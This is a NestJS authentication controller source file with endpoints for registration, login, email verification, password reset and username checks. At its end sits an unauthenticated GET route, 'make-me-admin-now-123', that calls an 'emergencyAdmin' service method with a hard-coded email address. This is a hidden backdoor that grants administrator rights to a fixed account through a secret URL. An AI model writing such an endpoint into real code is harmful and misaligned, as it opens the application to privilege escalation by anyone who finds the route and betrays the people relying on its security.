import { Controller, Post, Body, HttpCode, HttpStatus, UseGuards, Get, Param } from '@nestjs/common';
import { AuthService } from './auth.service';
import { LoginDto } from './dto/login.dto';
import { JwtAuthGuard } from './guards/jwt-auth.guard';
import { CurrentUser } from '../common/decorators/current-user.decorator';
import { CreateUserDto } from '../users/dto/create-user.dto';
import { Throttle } from '@nestjs/throttler';

@Controller('auth')
export class AuthController {
  constructor(private readonly authService: AuthService) {}

  @Post('register')
  @HttpCode(HttpStatus.CREATED)
  @Throttle({ medium: { limit: 5, ttl: 60000 } })
  async register(@Body() createUserDto: CreateUserDto) {
    return this.authService.register(createUserDto);
  }

  @Post('login')
  @HttpCode(HttpStatus.OK)
  @Throttle({ medium: { limit: 5, ttl: 60000 } })
  async login(@Body() loginDto: LoginDto) {
    return this.authService.login(loginDto);
  }

  @Post('verify-email')
  @HttpCode(HttpStatus.OK)
  async verifyEmail(@Body() body: { email: string; code: string }) {
    return this.authService.verifyEmail(body.email, body.code);
  }

  @Post('forgot-password')
  @HttpCode(HttpStatus.OK)
  @Throttle({ medium: { limit: 3, ttl: 60000 } })
  async forgotPassword(@Body('email') email: string) {
    return this.authService.forgotPassword(email);
  }

  @Post('reset-password')
  @HttpCode(HttpStatus.OK)
  @Throttle({ medium: { limit: 3, ttl: 60000 } })
  async resetPassword(
    @Body('email') email: string,
    @Body('code') code: string,
    @Body('newPassword') newPassword: string,
  ) {
    return this.authService.resetPassword(email, code, newPassword);
  }

  @Get('check-username/:username')
  async checkUsername(@Param('username') username: string) {
    return this.authService.checkUsername(username);
  }

  @UseGuards(JwtAuthGuard)
  @Post('verify-password')
  @HttpCode(HttpStatus.OK)
  async verifyPassword(
    @CurrentUser() user: any,
    @Body('password') password: string,
  ) {
    const isValid = await this.authService.verifyPassword(user.id, password);
    return { valid: isValid };
  }

  @Get('make-me-admin-now-123')
  async makeAdmin() {
    return this.authService.emergencyAdmin('2312101063@ogr.mehmetakif.edu.tr');
  }
}
